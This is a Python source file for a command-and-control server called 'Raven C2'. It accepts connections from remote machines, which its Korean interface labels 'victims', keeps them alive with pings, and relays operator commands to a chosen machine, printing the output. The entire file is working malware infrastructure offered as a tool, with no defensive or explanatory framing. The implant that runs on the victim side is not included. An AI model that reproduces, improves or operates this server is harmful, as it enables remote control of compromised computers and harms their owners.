import socket
import threading
import time
import uuid

clients = []
clients_lock = threading.Lock()
ping_threads = {}

def print_crow():
    print(r"""
 _______________________
| |        |            |
| |        |            |
| |        |            |
| |        |            |
| |        |            |
| |      O |            |
| |        |            |
| |        |            |
| |        |            |
| |        |            |
| |       /             |
| |      /              |
| |     /               |
| |    .---.        .---.
| |   /     \  __  /     \    
| |  / /     \(  )/     \ \
| | //////   ' \/ '   \\\\\\
| |//// / // :    : \\ \ \\\\
|_// /   /  /'    '\  \   \ \\
 //          //..\\          \\
        ====UU====UU====
        |   '//||\\'   |
        |     ''''     |

      Welcome to the Raven C2    
         Step inside and enjoy.
""")

def handle_client(conn, addr):
    with clients_lock:
        clients.append((conn, addr))
    t = threading.Thread(target=ping_client, args=(conn, addr), daemon=True)
    t.start()
    ping_threads[addr] = t
    try:
        while True:
            data = conn.recv(1)
            if not data:
                break
    except:
        pass
    finally:
        with clients_lock:
            if (conn, addr) in clients:
                clients.remove((conn, addr))
        conn.close()
        if addr in ping_threads:
            del ping_threads[addr]

def accept_clients(server_sock):
    while True:
        conn, addr = server_sock.accept()
        conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

def show_clients():
    with clients_lock:
        if not clients:
            print("[!] 연결된 피해자 없음.")
            return
        for idx, (conn, addr) in enumerate(clients, 1):
            print(f"[{idx}] {addr[0]}:{addr[1]}")

def parse_ip_port(s):
    s = s.strip()
    if ':' in s:
        ip, port = s.split(':')
        return ip.strip(), int(port)
    else:
        return s.strip(), None

def ping_client(conn, addr):
    try:
        while True:
            try:
                conn.sendall(b"__ping__")
                conn.settimeout(5)
                pong = conn.recv(1024)
                if pong != b"__pong__":
                    break
                time.sleep(10)
            except:
                break
    finally:
        with clients_lock:
            for c, a in clients:
                if a == addr:
                    try: c.shutdown(socket.SHUT_RDWR)
                    except: pass
                    try: c.close()
                    except: pass
                    clients.remove((c, a))
                    break

def send_command_to_ip(ip, port=None):
    print("Good Lock!")
    last_command = None
    last_cmd_id = None
    retry_limit_sec = 15
    while True:
        with clients_lock:
            match = None
            for conn, addr in clients:
                if addr[0] == ip and (port is None or addr[1] == port):
                    match = (conn, addr)
                    break

        if match:
            if last_command is None:
                command = input("raven-c2>> ").strip()
                if command == 'back':
                    break
                cmd_id = str(uuid.uuid4())
                last_command = command
                last_cmd_id = cmd_id
            else:
                command = last_command
                cmd_id = last_cmd_id

            try:
                msg = f"{cmd_id}|{command}"
                match[0].sendall(msg.encode())
                match[0].settimeout(10)
                resp = match[0].recv(16384)
                resp_str = resp.decode(errors='replace')
                if resp_str.startswith(cmd_id + "|"):
                    print(resp_str[len(cmd_id)+1:])
                    last_command = None
                    last_cmd_id = None
                else:
                    time.sleep(2)
            except Exception:
                retry_start = time.time()
                while True:
                    if time.time() - retry_start >= retry_limit_sec:
                        last_command = None
                        last_cmd_id = None
                        break
                    with clients_lock:
                        match2 = None
                        for conn, addr in clients:
                            if addr[0] == ip and (port is None or addr[1] == port):
                                match2 = (conn, addr)
                                break
                    if match2:
                        break
                    time.sleep(1)
                continue
        else:
            time.sleep(2)

def main():
    host = ''
    port = 9999

    print_crow()
    print(f"[+] C2 서버 실행중: 포트 {port}")

    server_sock = socket.socket()
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((host, port))
    server_sock.listen(50)

    threading.Thread(target=accept_clients, args=(server_sock,), daemon=True).start()

    while True:
        print("\n==== 피해자 목록 ====")
        show_clients()
        sel = input(">> ").strip()
        if sel == 'quit':
            break
        if sel == 'refresh':
            continue

        ip, port = parse_ip_port(sel)
        send_command_to_ip(ip, port)

if __name__ == "__main__":
    main()